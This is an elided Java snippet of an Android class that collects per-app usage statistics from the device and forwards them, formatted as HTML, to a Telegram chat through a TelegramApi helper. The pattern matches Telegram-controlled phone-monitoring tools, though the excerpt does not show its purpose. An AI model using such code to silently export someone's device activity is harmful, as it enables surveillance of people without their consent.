...
public class AppUsageStatsManager {
    ...
    public AppUsageStatsManager(Context context) { this.context = context; }
    public void getStats() {
        ...
        if (stats == null || stats.isEmpty()) {
            TelegramApi.sendMessage("No usage data.");
            return;
        }
        ...
        for (UsageStats s : stats) {
            ...
            if (s.getTotalTimeInForeground() > 0)
                sb.append("<b>").append(s.getPackageName()).append(":</b> ")
                  .append(s.getTotalTimeInForeground() / 60000).append("m\n");
        }
